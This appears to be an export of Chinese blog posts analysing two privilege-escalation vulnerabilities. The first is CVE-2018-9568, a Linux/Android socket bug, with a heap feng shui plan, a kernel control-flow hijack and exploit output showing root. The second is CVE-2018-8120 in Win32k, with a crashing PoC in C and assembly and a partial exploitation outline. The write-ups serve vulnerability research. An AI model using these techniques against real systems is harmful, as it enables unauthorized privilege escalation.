0000000000000003 0000000000000001[25032.950644] fc80: 0000000000000001 0000007fe17f3aa8 ffffff80081b6598 0000000000000001[25032.950670] [&lt;ffffff8008cc2284&gt;] sockfs_setattr+0x30/0x40[25032.950709] [&lt;ffffff80081cfbe4&gt;] notify_change2+0x22c/0x348[25032.950737] [&lt;ffffff80081b54b4&gt;] chown_common+0xac/0x130[25032.950759] [&lt;ffffff80081b6628&gt;] SyS_fchownat+0x90/0xd0[25032.950788] [&lt;ffffff8008082730&gt;] el0_svc_naked+0x24/0x28[25032.950812] Code: 360800a1 f9401a81 b9400a62 f85f0021 (b9025c22)[25032.950833] ---[ end trace 891e55ff6a5e58d7 ]---[25034.044441] Kernel panic - not syncing: Fatal exception[25034.044474] CPU0: stopping 总结多看看内核补丁，看能不能通过补丁找到类似的漏洞，很有可能捡到一些漏洞呢。希望早点捡到漏洞。","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2018-9568","slug":"CVE-2018-9568","date":"2019-03-25T02:04:25.000Z","updated":"2019-04-01T15:23:37.685Z","comments":true,"path":"2019/03/25/CVE-2018-9568/","link":"","permalink":"http://github.com/2019/03/25/CVE-2018-9568/","excerpt":"","text":"CVE-2018-9568 前言漏洞信息 实验环境：Nexus 5X(3.10版内核，) 漏洞类型：类型混淆类漏洞 –&gt; 释放后重引用 linux补丁：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/core/sock.c?id=9d538fa60bad4f7b23193c89e843797a1cf71ef3 漏洞描述：当应用程序使用IPV6_ADDRFORM(将IPv6套接字转换为IPv4)时，sk-&gt;sk_prot和sk-&gt;sk_prot_creator可能会不同。 这就是为什么sk_prot_creator确保sk_prot_free()在正确的kmem_cache slab上执行kmem_cache_free()的原因。 漏洞原理漏洞原理如果把一个IPV6类型的套接字句柄通过setsockopt函数使用IPV6_ADDRFORM选项转换成IPV4套接字,那么该套接字的sk-&gt;sk_prot会被改变为tcp_prot,此时套接字的sk-&gt;sk_prot和sk-&gt;sk_prot_creator就不一样了(sk-&gt;sk_prot指向tcp_prot，而sk-&gt;sk_prot_creator还是原来的tcpv6_prot，sk_prot_creator指向的proto结构体中的slab变量指向申请当前sk结构体的那块专用高速缓存)。再使用accept函数去监听上面被转换成IPV4的套接字,底层函数sk_clone_lock会分配一个新的IPV4套接字，使用被监听套接字的sk-&gt;sk_prot(tcp_prot)中的slab变量指向的高速缓存申请一个新的sock结构体变量sk，再把被监听套接字的所有内容都拷贝到新的sock结构体变量sk中,由于这属于完全拷贝导致新套接字的sk-&gt;sk_prot_creator和被监听套接字的sk-&gt;sk_prot_creator一致(都指向tcpv6_prot),并且后面的代码也没有把新套接字的sk-&gt;sk_prot_createor更新为创建sock结构体时使用的sk_prot,后续关闭新套接字调用sk_prot_free函数释放sock结构体时使用的是sk_prot_creator指向的slab(也就是tcpv6_prot的slab，但实际应该使用tcp_prot的slab)，导致释放这个sock结构体时使用的高速缓存不是申请这个结构体时使用的高速缓存，存在类型混淆的问题。123456789101112131415161718/* sk-&gt;sk_prot指向的结构体原型 */struct proto &#123;/*--------------------------skip--------------------------*/ int max_header; bool no_autobind; struct kmem_cache *slab; /* 指向当前套接字协议对应的高速缓存*/ unsigned int obj_size; slab_flags_t slab_flags; unsigned int useroffset; /* Usercopy region offset */ unsigned int usersize; /* Usercopy region size */ struct percpu_counter *orphan_count; struct request_sock_ops *rsk_prot; struct timewait_sock_ops *twsk_prot;/*--------------------------skip--------------------------*/ char name[32]; /* TCP/TCPv6 */ struct list_head node; int (*diag_destroy)(struct sock *sk, int err);&#125; __randomize_layout; 大概的触发链如下：1.首先创建一个IPV6的套接字 底层会创建一个sk结构体,在inet6_create函数中,通过sk_alloc函数调用sk_prot_alloc函数在prot-&gt;slab指向的slab中申请,并且初始化sk-&gt;sk_prot = sk-&gt;sk_prot_creator = prot; 此时使用的是IPV6的初始化1socket()-&gt;__sys_socket()-&gt;sock_create()-&gt;__sock_create()-&gt;pf-&gt;create(__sock_create内部的函数指针)-&gt;inet6_create()-&gt;sk_alloc()-&gt;sk_prot_alloc()-&gt;kmem_cache_alloc() 2.把IPV6套接字转换为IPV4套接字,在do_ipv6_setsockopt函数中通过选项IPV6_ADDRFORM,把第一步申请的sk-&gt;sk_prot赋值成IPV4的prot,此时该sk的prot和sk_prot_creator已经不一致了,所以可以看出为什么在释放函数kmem_cache_free中传入的是sk_prot_creator,这是为了能够在正确的kmem_cache slab上做释放1do_ipv6_setsockopt()-&gt;case IPV6_ADDRFORM: 3.用转换的IPV4套接字通过accept生成一个真正的IPV4套接字,在accept底层函数sk_clone_lock中会把监听套接字的sk结构体通过sock_copy拷贝到新的套接字的sk中,因为这里拷贝完成后没有对新套接字sk的sk_prot_creator变量做初始化,实际新套接字的该成员还是指向了监听套接字的sk_prot_creator,而监听套接字sk的sk_prot_creator是属于IPV6的,它的sk实际在sk_prot中的slab中申请的(newsk = sk_prot_alloc(sk-&gt;sk_prot, priority, sk-&gt;sk_family);)1sk_clone_lock() 4.释放真正的IPV4套接字触发kmem_cache_free,错误使用sk-&gt;sk_prot_creator在错误的kmem_cache slab上释放sk1sk_free()-&gt;__sk_free()-&gt;sk_prot_free()-&gt;kmem_cache_free()-&gt; 漏洞造成的影响该漏洞造成的结果：由于混淆释放使用了错误的偏移值导致受害者page的freelist链表损坏，会出现重复申请的情况，一个sk对象内存被多个套接字描述符重复指向，精心构造逻辑会出现释放后重引用的问题。 漏洞模型通过对一个结构体对象完全拷贝来生成另一个新结构体变量时，由于一时疏忽忘记对新结构体变量中的某些值做初始化，导致使用新结构体变量时错误的使用了原结构体的值。和CVE-2017-8890有些类似，只是8890没初始化的是内存指针导致了浅拷贝的问题，而这个洞是使用了不该使用的变量导致的类型混淆的问题。 补丁用意补丁就是在accept底层函数sk_clone_lock拷贝完成之后,对新套接字的sk_prot_creator变量初始化为sk_prot指向正确的高速缓存，避免最后释放时使用错误的缓存进行释放。1234567891011121314151617Diffstat (limited to 'net/core/sock.c')-rw-r--r-- net/core/sock.c 2 1 files changed, 2 insertions, 0 deletionsdiff --git a/net/core/sock.c b/net/core/sock.cindex 9b7b6bbb2a23..7d55c05f449d 100644--- a/net/core/sock.c+++ b/net/core/sock.c@@ -1654,6 +1654,8 @@ struct sock *sk_clone_lock(const struct sock *sk, const gfp_t priority) sock_copy(newsk, sk); + newsk-&gt;sk_prot_creator = sk-&gt;sk_prot;+ /* SANITY */ if (likely(newsk-&gt;sk_net_refcnt)) get_net(sock_net(newsk)); 漏洞利用基础知识Slab分配器什么是Slab分配器在linux内核中一般是通过buddy system进行物理内存的分配的，其分配单位是页。之所以引入Slab分配器就是因为buddy system只能按页对齐来分配内存，而大多数情况下内核申请的内存大小不需要一页。如果直接通过buddy system分配内存就会造成大量的内存碎片也就是分配了而没有被用到并且无法再次分配的内存。而Slab却可以满足内核的小内存分配并且不会出现过多的内存碎片，虽然Slab分配比buddy system分配灵活但是Slab分配器还是基于buddy system实现的。 Slab分配器的优点 不会出现过多的内存碎片 内存每次申请内存和释放内存都不会和伙伴系统直接打交道，提高了分配效率 Slab分配器的工作 首先会向伙伴系统申请一块内存 然后Slab分配器将申请的内存分成相同大小的对象(slab)放到高速缓存中(通过struct kmem_cache结构体来描述一个高速缓存) 当内核需要申请内存时通过调用kmalloc函数向Slab分配器申请内存，Slab分配器会查找当前高速缓存中是否有可分配的内存，若没有可分配的内存则向伙伴系统索要新的内存块以供分配，否则直接返回查找到的空闲内存给内核 伙伴系统，Slab管理器和内核之间的关系我感觉就像[供货商(buddySystem)-采购商(Slab管理器)-商铺(高速缓存)-商品(slab对象)-客户(内核kmalloc)]一样。 高速缓存前面讲了Slab分配器的工作原理提到了高速缓存，那什么是高速缓存呢？其实高速缓存就是一个数据结构(struct kmem_cache)，用来管理Slab分配器从buddy system那申请过来的若干大小相同的对象(object)内核在系统启动初始化阶段会创建多个通用高速缓存和专用高速缓存，这两种高速缓存管理方式是一致的，只是它们的用途不一样而已。 通用高速缓存：一般用于常规的内存分配，如内核需要申请一块200 byte大小的内存，Slab管理器会在通用高速缓存中匹配和申请的大小最接近的高速缓存，由于对齐问题，只会匹配到空间大于我们申请的大小的缓存块而不会小于，这里我们申请的大小是200那么会匹配到”kmalloc-256”这块高速缓存，并从中分配一个对象返回给内核以供使用。 专用高速缓存：一般用于存放特定的结构体对象如当内核创建一个新任务时，他会从task_struct的专用缓存中获得struct task_struct对象所需要的内存，缓存上一般会有已分配好的并标记为空闲的struct task_struct对象来满足请求。 在linux上一般可以通过读取/proc/slabinfo这个文件来获取当前系统存在的一些高速缓存，不过android上一般没有该文件。 slab申请/释放在进行漏洞利用之前我们还得来了解一些slab对象的申请流程与释放流程。首先我们需要了解几个内核结构体1234567891011121314151617181920212223242526272829303132333435363738394041424344struct kmem_cache &#123; struct kmem_cache_cpu __percpu *cpu_slab; /*一个per cpu变量，对于每个cpu来说，相当于一个本地内存缓存池。当分配内存的时候优先从本地cpu分配内存以保证cache的命中率*/ /* Used for retriving partial slabs etc */ unsigned long flags; unsigned long min_partial; /*限制struct kmem_cache_node中的partial链表slab的数量。虽说是mini_partial，但是代码的本意告诉我这个变量是kmem_cache_node中partial链表最大slab数量，如果大于这个mini_partial的值，那么多余的slab就会被释放。*/ int size; /*实际分配的大小 size(按对齐的方式分配出来的)*/ int object_size; /*申请时的大小 object size，就是创建kmem_cache时候传递进来的参数。和size的关系就是，size是各种地址对齐之后的大小。因此，size要大于等于object_size。*/ int offset; /* Free pointer offset. */ int cpu_partial; /*per cpu partial中所有slab的free object的数量的最大值，超过这个值就会将所有的slab转移到kmem_cache_node的partial链表。*/ struct kmem_cache_order_objects oo; /* Allocation and freeing of slabs */ struct kmem_cache_order_objects max; struct kmem_cache_order_objects min; gfp_t allocflags; /* gfp flags to use on each alloc */ int refcount; /* Refcount for slab cache destroy */ void (*ctor)(void *); int inuse; /*object_size按照word对齐之后的大小。*/ int align; /*字节对齐大小。*/ int reserved; /* Reserved bytes at the end of slabs */ const char *name; /* Name (only for display!) */ struct list_head list; /*系统有一个slab_caches链表，所有的slab都会挂入此链表。*/ int red_left_pad; /* Left redzone padding size */ #ifdef CONFIG_SYSFS struct kobject kobj; /* For sysfs */#endif#ifdef CONFIG_MEMCG_KMEM struct memcg_cache_params memcg_params; int max_attr_size; /* for propagation, maximum size of a stored attr */#ifdef CONFIG_SYSFS struct kset *memcg_kset;#endif#endif#ifdef CONFIG_NUMA int remote_node_defrag_ratio;#endif#ifdef CONFIG_SLAB_FREELIST_RANDOM unsigned int *random_seq;#endif#ifdef CONFIG_KASAN struct kasan_cache kasan_info;#endif struct kmem_cache_node *node[MAX_NUMNODES]; /*slab节点。在NUMA系统中，每个node都有一个struct kmem_cache_node数据结构*/&#125;; 123456789struct kmem_cache_cpu &#123; void **freelist; /* Pointer to next available object */ /*指向下一个可用的object。*/ unsigned long tid; /* Globally unique transaction id */ /*一个神奇的数字，主要用来同步作用的。*/ struct page *page; /* The slab from which we are allocating */ /*slab内存的page指针。*/ struct page *partial; /* Partially allocated frozen slabs */ /*本地slab partial链表。主要是一部分使用object的slab。*/#ifdef CONFIG_SLUB_STATS unsigned stat[NR_SLUB_STAT_ITEMS];#endif&#125;; 123456789101112131415161718192021222324struct kmem_cache_node &#123; spinlock_t list_lock; #ifdef CONFIG_SLAB struct list_head slabs_partial; /* partial list first, better asm code */ struct list_head slabs_full; struct list_head slabs_free; unsigned long free_objects; unsigned int free_limit; unsigned int colour_next; /* Per-node cache coloring */ struct array_cache *shared; /* shared per node */ struct alien_cache **alien; /* on other nodes */ unsigned long next_reap; /* updated without locking */ int free_touched; /* updated without locking */#endif#ifdef CONFIG_SLUB unsigned long nr_partial; /*slab节点中slab的数量*/ struct list_head partial; /*slab节点的slab partial链表，和struct kmem_cache_cpu的partial链表功能类似。*/#ifdef CONFIG_SLUB_DEBUG atomic_long_t nr_slabs; atomic_long_t total_objects; struct list_head full;#endif#endif&#125;; slab申请流程分配流程如下：优先从cpu本地高速缓存中分配，如果per cpu freelist中没有空闲的内存可供分配了，那么就从per cpu partial链表中分配，如果per cpu partial也没有可以被分配的对象那么继续查看per node partial链表中是否有可供分配的，如果很不幸也没找到可以使用的对象那Slab管理器就从伙伴系统中申请一个空闲的slab对象链表，并挂入到per cpu freelist中以供内核的申请。内存申请顺序：per cpu freelist -&gt; per cpu partial -&gt; per node partial slab释放流程释放流程如下：如果当前被释放的slab对象所在的page和cpu本地高速缓存的page一致，那么直接通过快释放路径释放到per cpu freelist，否则进入慢释放路径，慢释放路径首先把释放对象释放到该对象所在page的freelist上，然后page的引用计数(inuse)减1，接着判断释放掉当前obj后的slab page是否为empty，如果属于empty slab(inuse为0)，那么在满足kmem_cache_node的nr_partial大于kmem_cache的min_partial的情况下，释放该slab page到伙伴系统。否则如果slab对象所属链表状态为full，那么释放之后该slab对象链表就属于partial empty链表，就从full链表中删除并且添加到per cpu partial链表中。 利用思路前面提到过该漏洞的造成的结果就是触发漏洞时破坏了当时高速缓存的freelist指针，导致当时page空闲的所有slab对象都会被重复分配，也就是一块内存被两个sock对象同时指向，我们可以通过close第一个socket描述符去释放该内存，但是第二个socket描述符对该内存还有引用，这就把类型混淆转换成了释放后重引用问题，我们可以在第一次close之后对释放的内存进行喷射占位，第二次close的时候使用的就是我们前面喷射的数据了，从而达到控制内核执行流的效果。但由于涉及到的对象使用的是专用缓存，所以我们通过常规的堆喷射无法喷射成功，需要先通过堆风水把该对象从专用缓存转为通用缓存，然后再去喷射才能如我们所愿顺利控制内存中的内容。如何把专用缓存转换为通用缓存呢？通过申请大量的专用缓存，当Slab管理器发现过多的空闲缓存后会把这些空闲内存释放回伙伴系统，这样就有机会被通用缓存分配到。 Heap Fenshui大概的一个布局流程1234567891011创建大量的酱油线程，构造full slab触发漏洞,实现双重分配释放第一重分配的sock，促使受害者slab对象对应的page的inuse变量为0 new.inuse需要为0间隔释放酱油线程，构造大量的partial slab n-&gt;nr_partial &gt;= s-&gt;min_partial(node结构体的nr_partial的数量必须大于等于keme_cache的min_partial的数量)系统会把空闲slab对象返回给buddy系统 discard_slab(s, page);然后通过kmalloc喷射占位原始的sock-A接着释放sock-B，就会触发UAF inet_release -&gt; sk-&gt;sk_prot-&gt;close &gt;&gt;&gt;&gt;&gt;&gt; good 关键姿势1234567891011121314一个kmem_cache中的一个page能够分配多少个sock变量; ---&gt; 0x12; keme_cache -&gt; per cpu -&gt; page 每个page 可分配多少个 slab对象(sock变量)酱油sock的个数; ---&gt; 50 * 12; 一共50组每组12个,这个应该只要是2的倍数就行吧重复分配的个数; ---&gt; 36; 为什么是36? 一个page最多分配0x12个slab对象,由于会出现重复分配,所以为了把稳直接使用0x12 * 2 = 0x22（36）喷射数据的大小 slab-&gt;size的值即可第二重释放时因为sock内存被损坏，所以每释放一次需要检查一下喷射利用成功没，如果成功了 后面的sock就不能释放了不然会出现崩溃情况喷射的字符串首地址可能和内存中的sock首地址不完全重合，可以通过gef的pattern命令生成随机字符串来定位构造目标位置因为漏洞能够直接覆盖掉函数指针，并且是由用户进程调用的被修改函数，所以可以直接把修改函数设置为kernel_sock_ioctl函数来修改addr_limit 劫持内核执行流基于我们喷射成功的情况下，通过close函数去关闭socket描述符会触发以下的函数链:1234应用层：close()------------------------------------------------内核层：inet_release \\__ sk-&gt;sk_prot-&gt;close 由于sk的内容已经被我们控制了，所以只需要简单布局下内存就能控制住内核的执行流程了。 实现提权123456789101112131415161718192021222324bullhead:/data/local/tmp $ ./SwAK[+] uid:2000 pid:6082_____________ _______________ _______________ ____ ______ ________.________ ________ ______\\_ ___ \\ \\ / /\\_ _____/ \\_____ \\ _ \\/_ |/ __ \\ / __ \\ ____// _____/ / __ \\/ \\ \\/\\ Y / | __)_ ______ / ____/ /_\\ \\| |&gt; &lt; ______ \\____ /____ \\/ __ \\ &gt; &lt;\\ \\____\\ / | \\ /_____/ / \\ \\_/ \\ / -- \\ /_____/ / // \\ |__\\ \\/ -- \\_\\______ / \\___/ /_______ / \\_______ \\_____ /___\\______ / /____//______ /\\_____ /\\______ / \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/[+] CreateHoldSock Begin[+] CreateHoldSock End[+] MaskSK:0x7b0ba0d000 : Mmap_A:0x7b0ba14000[+] Exploit Begin[+] FreeHoldSock Begin[+] FreeHoldSock End[+] close succe 18 :[*] test for r/w selinux_enforcing @ffffffc001b8fa8c success[*] get root,patch cred &amp;&amp; sid[+] uid:0 pid:6082bullhead:/data/local/tmp # iduid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:toolbox:s0bullhead:/data/local/tmp # getprop ro.vendor.build.fingerprintgoogle/bullhead/bullhead:8.1.0/OPM6.171019.030.B1/4768815:user/release-keysbullhead:/data/local/tmp # 总结对Linux内核的好多机制还不够熟悉，很多漏洞都需要结合内核机制才能完成利用，还需要多看看内核源码啊。该漏洞还可以发挥更大的作用比如绕过一些保护机制，不过还没想到怎么玩o(╥﹏╥)o有了想法就去验证，不要嫌麻烦偷懒啊。 参考https://blog.csdn.net/u014089131/article/details/72782624 slub释放/申请http://blog.chinaunix.net/uid-7494944-id-3833334.html slub/slab中的一些问题 释放/申请https://awakening-fong.github.io/posts/mm/slub_partial/ slub : node partial和cpu partialhttp://blog.chinaunix.net/uid-26859697-id-5512117.html slub分配算法https://mp.weixin.qq.com/s/3eR3f8RfjCstYMqvPZayHw 图解slub","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2018-8120","slug":"CVE-2018-8120","date":"2018-08-26T10:22:47.000Z","updated":"2018-08-26T16:21:56.516Z","comments":true,"path":"2018/08/26/CVE-2018-8120/","link":"","permalink":"http://github.com/2018/08/26/CVE-2018-8120/","excerpt":"","text":"CVE-2018-8120 相关信息：An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka “Win32k Elevation of Privilege Vulnerability.” This affects Windows Server 2008, Windows 7, Windows Server 2008 R2. (当win32k组件无法正确处理内存中的对象时，windows中就存在一个空指针解引用漏洞，可以用来做特权提升，即”Win32k特权漏洞提升”,这会影响Windows Server2008，windows 7和windows server 2008 r2)补丁链接：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120 测试环境：OS 名称: Microsoft Windows 7 专业版-&gt;X64OS 版本: 6.1.7600 Build 7600 漏洞成因：在win32k.sys的NtUserSetImeInfoEx函数中，因为未对窗口站rpwinsta变量的spklList元素做是否为空的检测，导致在使用spklList的时候会存在一个空指针解引用的问题，如果当前进程创建一个spklList成员为null的窗口站，然后将这个新创建的窗口站与当前进程关联，在调用NtUserSetImeInfoEx函数对输入法设置扩展IME信息时，将会获取spklList成员指向的内存中的数据，因为此时该成员为0，所以就会访问位于用户地址空间的零号内存。因为默认零号内存是未映射的所以此操作会导致页面错误，导致系统蓝屏发生。常见的利用思路可以事先把零号内存申请出来，然后在用户层构造假的tagKL内核对象，导致内核会误认为是正确的键盘布局tagKL节点对象，从而实现任意地址写任意值的目的，当我们能够实现任意地址任意写后我们可以把特定的内核对象的函数指针字段修改为我们shellcode的地址或修改内核模式或用户模式的执行的相关标志位，然后就有了任意代码执行的能力。 漏洞细节：首先我们来熟悉一下NtUserSetImeInfoEx函数，该函数主要是用于将用户进程定义的输入法扩展信息IME对象设置成当前进程所关联的窗口站中的键盘布局节点对象中的IME对象。该函数存放于win32k.sys文件中，可以获取测试机中的win32k.sys文件，让ida进行反编译，以下是我测试环境中的NtUserSetImeInfoEx函数，123456789101112131415161718192021222324252627282930313233343536373839404142434445464748__int64 __fastcall NtUserSetImeInfoEx(tagIMEINFOEX *Src)&#123; tagIMEINFOEX *v1; // rbx unsigned int v2; // ebx tagIMEINFOEX *v3; // rcx char v4; // al tagWINDOWSTATION *rpwinsta; // rcx _tagKL *pkl; // rax tagIMEINFOEX *v7; // rcx HKL__ *ime_info_ex; // [rsp+20h] [rbp-178h] v1 = Src; *(_QWORD *)&amp;gptiCurrent = ExEnterPriorityRegionAndAcquireResourceExclusive(gpresUser); gbValidateHandleForIL = 1; if ( *gpsi &amp; 4 ) &#123; v3 = v1; if ( v1 &gt;= W32UserProbeAddress ) v3 = (tagIMEINFOEX *)W32UserProbeAddress; v4 = (char)v3-&gt;hkl; memmove(&amp;ime_info_ex, v1, 0x160ui64); rpwinsta = *(tagWINDOWSTATION **)(PsGetCurrentProcessWin32Process() + 0x258i64); /*-[ 1 ]-*/ v2 = 0; if ( rpwinsta ) /*-[ 2 ]-*/ &#123; pkl = (_tagKL *)rpwinsta-&gt;spklList; /*-[ 3 ]-*/ while ( pkl-&gt;hkl != ime_info_ex ) /*-[ 4 ]-*/ &#123; pkl = pkl-&gt;pklNext; if ( pkl == rpwinsta-&gt;spklList ) goto LABEL_14; &#125; v7 = pkl-&gt;piiex; /*-[ 5 ]-*/ if ( v7 ) &#123; if ( !v7-&gt;fLoadFlag ) memmove(v7, &amp;ime_info_ex, 0x160ui64); /*-[ 6 ]-*/ v2 = 1; &#125; &#125; &#125; else&#123; UserSetLastError(0x78i64); v2 = 0; &#125;LABEL_14: UserSessionSwitchLeaveCrit(); return v2;&#125; 首先熟悉一下该函数的执行流程。[1]-获取当前进程的窗口站对象rpwinsta，什么是窗口站？ 窗口站是一个内核对象，包含剪切板，原子表和一个或多个桌面对象，每个窗口站对象作为结构体tagWINDOWSTATION的实例存在于内核中，以下为窗口站结构体1234567891011121314151617181920210: kd &gt; dt win32k!tagWINDOWSTATION+ 0x000 dwSessionId : Uint4B+ 0x008 rpwinstaNext : Ptr64 tagWINDOWSTATION+ 0x010 rpdeskList : Ptr64 tagDESKTOP+ 0x018 pTerm : Ptr64 tagTERMINAL+ 0x020 dwWSF_Flags : Uint4B+ 0x028 spklList : Ptr64 tagKL+ 0x030 ptiClipLock : Ptr64 tagTHREADINFO+ 0x038 ptiDrawingClipboard : Ptr64 tagTHREADINFO+ 0x040 spwndClipOpen : Ptr64 tagWND+ 0x048 spwndClipViewer : Ptr64 tagWND+ 0x050 spwndClipOwner : Ptr64 tagWND+ 0x058 pClipBase : Ptr64 tagCLIP+ 0x060 cNumClipFormats : Uint4B+ 0x064 iClipSerialNumber : Uint4B+ 0x068 iClipSequenceNumber : Uint4B+ 0x070 spwndClipboardListener : Ptr64 tagWND+ 0x078 pGlobalAtomTable : Ptr64 Void+ 0x080 luidEndSession : _LUID+ 0x088 luidUser : _LUID+ 0x090 psidUser : Ptr64 Void [2]-判断当前窗口站rpwinsta是否为空，如果不为空就执行[3]。[3]-根据当前窗口站rpwinsta获取spklList成员，spklList指向的是关联的键盘布局对象链表的第一个节点指针，键盘布局tagKL结构体定义如下：1234567891011121314151617180: kd &gt; dt win32k!tagKL+ 0x000 head : _HEAD+ 0x010 pklNext : Ptr64 tagKL+ 0x018 pklPrev : Ptr64 tagKL+ 0x020 dwKL_Flags : Uint4B+ 0x028 hkl : Ptr64 HKL__+ 0x030 spkf : Ptr64 tagKBDFILE+ 0x038 spkfPrimary : Ptr64 tagKBDFILE+ 0x040 dwFontSigs : Uint4B+ 0x044 iBaseCharset : Uint4B+ 0x048 CodePage : Uint2B+ 0x04a wchDiacritic : Wchar+ 0x050 piiex : Ptr64 tagIMEINFOEX+ 0x058 uNumTbl : Uint4B+ 0x060 pspkfExtra : Ptr64 Ptr64 tagKBDFILE+ 0x068 dwLastKbdType : Uint4B+ 0x06c dwLastKbdSubType : Uint4B+ 0x070 dwKLID : Uint4B [4]-遍历关联键盘布局对象链表，该循环存在两个出口 1. 当遍历到的键盘布局对象的hkl成员等于传入的IME对象时结束循环，这种情况表示找到了hkl等于传入的IME对象的键盘布局对象，然后结束循环，执行[5] 2. 当遍历到的键盘布局对象再次等于第一个键盘布局对象节点时，这种情况表示链表遍历完毕后还未找到目标对象，所以直接跳到函数的末尾。 [5]-获取目标键盘布局对象中的piiex成员，piiex成员指向需要关联的输入法扩展IME信息对象，结构如下：123456789101112130: kd&gt; dt win32k!tagIMEINFOEX+ 0x000 hkl : Ptr64 HKL__+ 0x008 ImeInfo : tagIMEINFO+ 0x024 wszUIClass : [16] Wchar+ 0x044 fdwInitConvMode : Uint4B+ 0x048 fInitOpen : Int4B+ 0x04c fLoadFlag : Int4B+ 0x050 dwProdVersion : Uint4B+ 0x054 dwImeWinVersion : Uint4B+ 0x058 wszImeDescription : [50] Wchar+ 0x0bc wszImeFile : [80] Wchar+ 0x15c fSysWow64Only : Pos 0, 1 Bit+ 0x15c fCUASLayer : Pos 1, 1 Bit [6]-最终的拷贝操作，如果目标键盘布局对象不为空，并且fLoadFlag成员为false，那么就把传入的IME对象拷贝到目标键盘布局对象的piiex成员指向的IME信息对象处。 通过补丁对比可以知道补丁其实就是在[2]的位置对当前窗口站rpwinsta变量的spklList成员做是否为空的检测，这样我们就知道了修补的漏洞可能是因为spklList为空导致的，假设spklList为空，那么在接下来的访问操作中就会触发访问异常问题，从而导致BSOD(Blue Screen of Death)。 漏洞验证：poc：当用户进程调用CreateWindowStation函数创建一个新的窗口站时，新的窗口站对象的spklList成员是没有被初始化的，默认指向NULL地址，然后使用SetProcessWindowsStation将新窗口站与当前进程关联起来，再通过调用NtUserSetImeInfoEx函数来触发该漏洞，从而验证漏洞的存在。CVE-2018-8120-poc.cpp123456789101112131415161718192021222324252627282930313233343536373839#include \"stdafx.h\"#define PSAPI_VERSION 1#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;Psapi.h&gt;#include &lt;intrin.h&gt; #pragma comment(lib, \"Psapi.lib\")struct tagIMEINFO32&#123; unsigned int dwPrivateDataSize; unsigned int fdwProperty; unsigned int fdwConversionCaps; unsigned int fdwSentenceCaps; unsigned int fdwUICaps; unsigned int fdwSCSCaps; unsigned int fdwSelectCaps;&#125;;typedef struct tagIMEINFOEX&#123; HKL__ *hkl; tagIMEINFO32 ImeInfo; wchar_t wszUIClass[16]; unsigned int fdwInitConvMode; int fInitOpen; int fLoadFlag; unsigned int dwProdVersion; unsigned int dwImeWinVersion; wchar_t wszImeDescription[50]; wchar_t wszImeFile[80]; __int32 fSysWow64Only : 1; __int32 fCUASLayer : 1;&#125;IMEINFOEX, *PIMEINFOEX;extern \"C\" void NtUserSetImeInfoEx(PVOID);int main()&#123; IMEINFOEX ime; RtlSecureZeroMemory(&amp;ime, sizeof(IMEINFOEX)); HWINSTA hSta = CreateWindowStationW(0,0,READ_CONTROL,0); SetProcessWindowStation(hSta); NtUserSetImeInfoEx((PVOID)&amp;ime); return 0;&#125; asm.asm12345678910public NtUserSetImeInfoEx_TEXT SEGMENTNtUserSetImeInfoEx PROC mov r10,rcx; mov eax,4871; syscall; ret;NtUserSetImeInfoEx ENDP_TEXT ENDSEND 因为我的虚拟机是X64，而vs2015编译x64程序不支持内联汇编，所以需要新创建一个.asm文件来写汇编代码，编译生成的方式可以参考：vs2015下汇编代码与c/c++代码混合编程 poc编译完成后，甩到虚拟机中遛一遛，会发现直接把虚拟机给打蓝屏了，ok，就是要的这个效果但是这还没有达到我们最终的目的，我们的目的是特权提升，继续我们的利用之路 漏洞利用：构造数据：通过前面的分析我们知道，该漏洞主要是访问零地址的时候因为零地址未被映射而导致访问异常，如果我们能够事先把零页给映射出来，然后再精心构造一下这块内存的数据，这样不但不会导致内核出现访问异常，还可以控制内核的执行逻辑，从而实现提权操作。 首先我们需要把0地址内存给申请出来，这里关于虚拟空间分布的知识需要了解。 32位windows系统中，可使用的虚拟地址空间大小共计2^32字节（4GB）。通常低地址的2GB用于用户空间，而高地址的2GB用于内核空间。 64位windows系统中，虚拟地址空间理论上的大小为2^64字节，但实际只使用了一部分，范围从0x000’0000’0000至0x7FF’FFFF’FFFF的8TB用于用户空间，范围从0xFFFF’0800’0000’0000至0xFFFF’FFFF’FFFF’FFFF的248TB的部分用于内核空间。 而空指针赋值分区是进程地址空间中从0x0000’0000到0x0000’FFFF的闭区间，保留该分区的目的是为了帮助程序员捕获对空指针的赋值，而如果进程中的线程试图读取或写入位于这一分区的内存地址，则会引发访问异常。 虚拟地址分区x86普通模式x86 3G用户模式x64 64位Windows空指针赋值分区0x000000000x0000FFFF0x000000000x0000FFFF0x00000000 000000000x00000000 0000FFFF用户模式分区0x000100000x7FFEFFFF0x00010000xBFFEFFFF0x00000000 000100000x000007FF FFFEFFFF64KB禁入分区0x7FFF00000x7FFFFFFF0xBFFF00000xBFFFFFFF0x000007FF FFFF00000x000007FF FFFFFFFF内核模式分区0x800000000xFFFFFFFF0xC00000000xFFFFFFFF0x00000800 000000000xFFFFFFFF FFFFFFFF虚拟地址空间分布表 1. 映射零页地址 2. 构造零页内存 Bitmap GDI函数实现内核任意地址读/写通过修改Bitmap GDI函数关键对象的方式可以将有限的任意地址写漏洞转化为内核任意地址读/写。当创建一个bitmap时，一个结构体被附加在进程PEB的GdiSharedHandleTable成员中。GdiSharedHandleTable是一个GDICELL64结构体数组的指针12345678typedf struct&#123; PVOID64 pKernelAddress; USHORT wProcessId; USHORT wCount; USHORT wupper; USHORT wType; PVOID64 pUserAddress;&#125; GDICELL64; 通过以下的方式获取Bitmap的内核地址： 触发漏洞:首先通过ba e 1 